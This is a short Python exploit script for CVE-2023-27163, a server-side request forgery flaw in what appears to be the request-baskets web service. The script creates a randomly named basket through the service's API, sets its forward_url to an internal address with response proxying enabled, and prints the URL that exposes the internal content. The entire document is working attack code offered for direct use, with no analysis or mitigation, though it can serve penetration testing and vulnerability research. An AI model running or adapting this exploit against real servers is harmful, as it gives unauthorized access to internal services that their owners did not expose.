#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# CVE-2023-27163 - SSRF Exploit
# By: https://github.com/kazzarahw
# Ref: https://www.cve.news/cve-2023-27163/

# Imports
import requests
import random
import string

# Config
target_url = "http://127.0.0.1:55555/" # Base URL, no '/web/'
redirect_url = "http://127.0.0.1:80/" # Redirect target URL

# Setup
basket_name = "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
api_url = f"{target_url}/api/baskets/{basket_name}"
payload = {
	"forward_url":redirect_url,
	"proxy_response":True,
	"insecure_tls":False,
	"expand_path":True,
	"capacity":200
}

# Run
response = requests.post(api_url, json=payload)
if response.status_code != 201:
	print(f"Error: {response.status_code} {response.reason}")
	exit(1)
else:
	print("Basket created.")
	print(f"Basket Token: {response.json()['token']}")
	print(f"Basket URL: {target_url}web/{basket_name}")
	print("            ^ this one is used to access the basket config/stuff.")
	print(f"Access URL: {target_url}{basket_name}")
	print("            ^ this one is used to access the redirected content.")
	print("            ^ this is the important one.")
